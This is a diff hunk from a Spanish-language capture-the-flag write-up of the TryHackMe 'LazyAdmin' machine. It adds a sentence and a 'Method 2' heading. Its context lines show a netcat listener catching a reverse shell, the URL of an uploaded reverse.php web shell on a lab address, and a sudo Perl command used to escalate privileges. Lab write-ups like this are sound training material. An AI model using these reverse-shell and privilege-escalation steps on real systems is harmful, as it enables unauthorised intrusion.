@@ -212,7 +212,9 @@ kimera@vault:~/Machines/THM/LazyAdmin/exploit$ nc -nlvp 1234
 listening on [any] 1234 ...
 ```
 
-Y entramos en la URL donde se aloja el archivo que recién subimos: `http://10.10.109.87/content/inc/ads/reverse.php`
+Y entramos en la URL donde se aloja el archivo que recién subimos: `http://10.10.109.87/content/inc/ads/reverse.php`. Con esto deberíamos haber obtenido una shell.
+
+#### :collision:Método - 2
 
 sudo /usr/bin/perl /home/itguy/backup.pl
 
